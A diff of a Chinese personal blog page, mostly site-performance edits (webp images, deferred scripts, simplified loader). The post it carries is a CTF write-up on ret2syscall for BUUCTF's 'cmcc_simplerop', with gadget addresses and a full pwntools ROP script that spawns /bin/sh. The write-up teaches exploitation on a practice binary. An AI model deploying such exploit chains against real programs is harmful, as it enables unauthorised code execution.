@@ -24,7 +24,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   
   
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
   
   
     <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
@@ -42,21 +42,21 @@
 <meta property="og:site_name" content="淋着雨">
 <meta property="og:description" content="ret2syscall 是很久之前就碰到的了，只不过当时的情况是不懂就直接找网上的 wp 糊弄着好像学会了，但其实并未入脑中。再一次碰到可以利用 ret2syscall 的题发现还是无法灵活处理，所以做此记录。ret2syscall，即返回到系统调用，通过设置相应寄存器的值并返回到系统调用地址（32位与64位略有区别）实现系统调用函数getshell。 32位与64位下ret2syscall的区别">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image1.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image2.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image3.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image4.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image5.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image6.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image1.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image2.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image3.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image4.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image5.webp">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image6.webp">
 <meta property="article:published_time" content="2026-03-13T13:59:28.000Z">
-<meta property="article:modified_time" content="2026-07-19T09:46:46.023Z">
+<meta property="article:modified_time" content="2026-08-31T14:58:51.533Z">
 <meta property="article:author" content="淋着雨">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="stack">
 <meta property="article:tag" content="syscall">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image1.png">
+<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/03/13/ret2syscall/image1.webp">
   
   
   
@@ -71,7 +71,7 @@
   
   
     
-<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous" defer></script>
 
   
   
@@ -108,27 +108,16 @@
   </div>
   </div>
   <script>
-    var time = null;
-    var startLoading = () => {
-      time = Date.now();
-      document.getElementById('loader').classList.remove("loading");
-    }
+    var loaderDone = false;
     var endLoading = () => {
-      if (!time) {
-        document.body.style.overflow = 'auto';
-        document.getElementById('loader').classList.add("loading");
-      } else {
-        if (Date.now() - time > 500) {
-          time = null;
-          document.body.style.overflow = 'auto';
-          document.getElementById('loader').classList.add("loading");
-        } else {
-          setTimeout(endLoading, 500 - (Date.now() - time));
-          time = null;
-        }
-      }
+      if (loaderDone) return;
+      loaderDone = true;
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loading");
     }
-    window.addEventListener('DOMContentLoaded', endLoading);
+    // 优化：加载遮罩改为固定短时长（DOMContentLoaded + 500ms，最多 1.5s），不再被网络请求拖住
+    window.addEventListener('DOMContentLoaded', () => setTimeout(endLoading, 500));
+    setTimeout(endLoading, 1500);
     document.getElementById('loader').addEventListener('click', endLoading);
   </script>
 
@@ -234,7 +223,7 @@
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
+  <img src="/avatar/avatar.webp" loading="lazy" decoding="async" alt="淋着雨" class="lazyload">
   <div class="sidebar-author-name">淋着雨</div>
   <div class="sidebar-description"></div>
 </div>
@@ -318,7 +307,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-03-13T13:59:28.000Z" itemprop="datePublished">2026-03-13</time>
-    <time style="display: none;" id="post-update-time">2026-07-19</time>
+    <time style="display: none;" id="post-update-time">2026-08-31</time>
   </span>
   
 </div>
@@ -379,14 +368,14 @@
 </tbody></table>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这里以BUUCTF中的“cmcc_simplerop”这道题为例。</p>
 <h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>查看程序信息，可知程序是 32 位静态链接的，且开启了 NX(栈上不可执行)，考虑构造 ROP 链。由于是静态链接，ret2libc 无法实现，考虑其他方法，比方说 ret2syscall。</p>
-<p><img src="image1.png" alt="程序信息"></p>
+<p><img src="image1.webp" alt="程序信息"></p>
 <p>查看程序各个段的信息，看到<code>bss</code>段可读可写；查看 gadgets 信息，可以找到<code>pop eax; ret</code>以及<code>pop edx; pop ecx; pop ebx; ret</code>这几个片段，那么只要能够让<code>eax=11，ebx=&quot;/bin/sh\0&quot;，ecx=0，edx=0</code>并返回到<code>int 0x80</code>处触发系统调用，就能够让程序执行<code>execve(&quot;/bin/sh\0&quot;)</code>来控制程序。</p>
-<p><img src="image2.png" alt="段信息"><br><img src="image3.png" alt="gadget"><br><img src="image4.png" alt="gadget"><br><img src="image5.png" alt="gadget"></p>
+<p><img src="image2.webp" alt="段信息"><br><img src="image3.webp" alt="gadget"><br><img src="image4.webp" alt="gadget"><br><img src="image5.webp" alt="gadget"></p>
 <h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><p>我们构造payload的思路如下：通过栈溢出跳转到read函数写入<code>/bin/sh\0</code>到 bss 段，接着通过 gadgets 清理栈上内容并设置寄存器信息，最后触发系统调用。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote()</span></span><br><span class="line">p = process(<span class="string">&quot;./&lt;ELF文件&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">bss = <span class="number">0x080EAF80</span></span><br><span class="line">read = <span class="number">0x806CD50</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span> + <span class="number">4</span>) + p32(read) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">11</span>) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>这题有一个雷点，就是ida所判断出的缓冲区大小是错误的。我们需要通过 gdb 动态调试，往程序写入内容并查看栈上信息，判断真正的偏移量。</p>
-<p><img src="image6.png" alt="gdb"></p>
+<p><img src="image6.webp" alt="gdb"></p>
 
       
     </div>
@@ -413,7 +402,7 @@
         
           
           
-            <img data-src="/covers/【哲风壁纸】jk-动漫-动漫壁纸.png" data-sizes="auto" alt="Earth靶机渗透" class="lazyload">
+            <img src="/covers/【哲风壁纸】光带-卡提希娅-少女.webp" loading="lazy" decoding="async" alt="Earth靶机渗透" class="lazyload">
           
         
         <a href="/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"></a>
@@ -431,7 +420,7 @@
       
         
         
-          <img data-src="/covers/【哲风壁纸】CG插画-CG美女插画.png" data-sizes="auto" alt="ret2libc" class="lazyload">
+          <img src="/covers/【哲风壁纸】圣杯战争-日本动漫.webp" loading="lazy" decoding="async" alt="ret2libc" class="lazyload">
         
       
       <a href="/2026/02/15/ret2libc/"></a>
@@ -551,7 +540,7 @@
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
+  <img src="/avatar/avatar.webp" loading="lazy" decoding="async" alt="淋着雨" class="lazyload">
   <div class="sidebar-author-name">淋着雨</div>
   <div class="sidebar-description"></div>
 </div>
@@ -626,9 +615,6 @@
     
     
     
-<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
-
-
 <script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
 
 
@@ -640,7 +626,7 @@
 
 
   
-<script src="../../../../js/aos.js"></script>
+<script src="../../../../js/aos.js" defer></script>
 
   <script>
     var aosInit = () => {
@@ -660,7 +646,7 @@
 
 
 
-<script src="../../../../js/pjax_script.js" data-pjax></script>
+<script src="../../../../js/pjax_script.js" data-pjax defer></script>
 
 
 
@@ -669,10 +655,17 @@
 
 
   
-<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous" defer></script>
 
   <script>
-    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--purple-1)","var(--purple-2)","var(--purple-3)","var(--purple-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--purple-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+    var fireworkInit = () => {
+      window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--purple-1)","var(--purple-2)","var(--purple-3)","var(--purple-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--purple-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', fireworkInit);
+    } else {
+      fireworkInit();
+    }
   </script>
 
 
@@ -698,7 +691,7 @@
           description: "",
           stripContent: "ret2syscall 是很久之前就碰到的了，只不过当时的情况是不懂就直接找网上的 wp 糊弄着好像学会了，但其实并未入脑中。再一次碰到可以利用 ret2syscall 的题发现还是无法灵活处理，所以做此记录。ret2syscall，即返回到系统调用，通过设置相应寄存器的值并返回到系统调用地址（32位与64位略有区别）实现系统调用函数getshell。 32位与64位下ret2syscall的区别   特性 32位(x86) 64位(x64)    触发系统调用的指令 int 0x80 sysc",
           date: "Fri Mar 13 2026 21:59:28 GMT+0800",
-          updated: "Sun Jul 19 2026 17:46:46 GMT+0800",
+          updated: "Mon Aug 31 2026 22:58:51 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
